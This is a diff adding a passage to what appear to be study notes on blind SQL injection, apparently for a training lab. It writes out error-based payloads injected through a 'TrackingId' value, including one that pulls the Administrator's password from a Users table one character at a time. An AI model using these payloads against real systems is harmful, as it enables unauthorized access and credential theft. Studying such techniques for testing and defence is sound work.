@@ -183,3 +183,21 @@
     #continue this series
     #for Oracle db, use SUBSTR function
     ```
+
+* Triggering SQL errors:
+
+  * Suppose these two requests are sent with 'TrackingId' value:
+
+    ```sql
+    xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+    #does not trigger error
+
+    xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+    #triggers error
+    ```
+
+  * Technique to retrieve data (one char at a time):
+
+    ```sql
+    xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Passord, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+    ```
